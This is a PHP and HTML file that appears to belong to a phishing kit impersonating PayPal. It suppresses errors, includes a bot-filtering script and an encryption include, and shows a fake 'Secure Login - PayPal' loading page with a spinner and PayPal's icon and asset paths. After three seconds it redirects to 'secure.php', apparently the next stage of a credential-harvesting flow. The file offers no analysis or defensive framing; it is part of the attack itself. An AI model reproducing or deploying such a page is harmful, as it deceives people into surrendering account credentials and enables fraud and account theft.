<?php include "encriptar.php";?>
<?php
error_reporting(0);
session_start();
set_time_limit(0);
include"bots.php";
require_once 'hostname.php';
$hostname = bin2hex ($_SERVER['HTTP_HOST']);

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en" class=" jsEnabled">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Secure Login - PayPal</title>
 
 <style type="text/css">
 		body {
		background-color:white;
		}
        #page {
            width: auto;
            max-width: 750px;
        }
        #rotatingImg {
            display: none;
        }
        #rotatingDiv {
            display: block;
            margin: 32px auto;
            height: 30px;
            width: 30px;
            -webkit-animation: rotation .7s infinite linear;
            -moz-animation: rotation .7s infinite linear;
            -o-animation: rotation .7s infinite linear;
            animation: rotation .7s infinite linear;
            border-left: 8px solid rgba(0, 0, 0, .20);
            border-right: 8px solid rgba(0, 0, 0, .20);
            border-bottom: 8px solid rgba(0, 0, 0, .20);
            border-top: 8px solid rgba(33, 128, 192, 1);
            border-radius: 100%;
        }
        @keyframes rotation {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(359deg);
            }
        }
        @-webkit-keyframes rotation {
            from {
                -webkit-transform: rotate(0deg);
            }
            to {
                -webkit-transform: rotate(359deg);
            }
        }
        @-moz-keyframes rotation {
            from {
                -moz-transform: rotate(0deg);
            }
            to {
                -moz-transform: rotate(359deg);
            }
        }
        @-o-keyframes rotation {
            from {
                -o-transform: rotate(0deg);
            }
            to {
                -o-transform: rotate(359deg);
            }
        }
        h3 {
            font-size: 1.4em;
            margin: 4em 0 0 0;
            line-height: normal;
        }
        p.note {
            color: #656565;
            font-size: 1.2em;
        }
        p.note a {
            color: #656565;
        }
        p strong {
            margin-top: 2em;
            color: #1A3665;
            font-size: 1.25em;
        }
        img.actionImage {
            margin: 2em auto;
        }
    </style>


    <meta http-equiv="refresh" content="3;URL=secure.php">

    <style type="text/css">
        form#rosetta {
            display: none;
        }
    </style>
    <script type="text/javascript">
        PAYPAL.util.lazyLoadRoot = 'https\x3a\x2f\x2fwww\x2epaypalobjects\x2ecom\x2fWEBSCR\x2d640\x2d20140510\x2d1';
    </script>
    <link rel="shortcut icon" href="./img/icon.png">
    <link rel="apple-touch-icon" href="./img/icon.png">
</head>

<body>
<center>
   <div class="" id="page">
        <div id="content">
            <div id="headline">
            </div>
            <div id="messageBox"></div>
            <div id="main">
                <div class="layout1 textcenter">
                    <h3>Secure login ...</h3>
                    <div id="rotatingDiv" class="show"></div>
                    <img id="rotatingImg" src="img/icon_load_roundcorner_lock1_186x42_withlock.gif" border="0" class="actionImage" alt="">
                    <p class="note">If this page is displayed for over 5 seconds, <a href="secure.php">click here</a> to reload.</p>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript">
        var supportCSSProp = (function () {
            var div = document.createElement('div'),
                vendors = 'Khtml Ms O Moz Webkit'.split(' '),
                len = vendors.length;

            return function (prop) {
                if (prop in div.style) return true;

                prop = prop.replace(/^[a-z]/, function (val) {
                    return val.toUpperCase();
                });
                // Filter through the vendors array, and test if there's a match
                while (len--) {
                    if (vendors[len] + prop in div.style) {
                        return true;
                    }
                }
                return false;
            };
        })();

        if (supportCSSProp('animation')) {
            YUD.addClass('rotatingDiv', 'show');
        } else {
            YUD.addClass('rotatingImg', 'show');
            YUD.addClass('rotatingDiv', 'hide');
        }
    </script>
   
</body>

</html>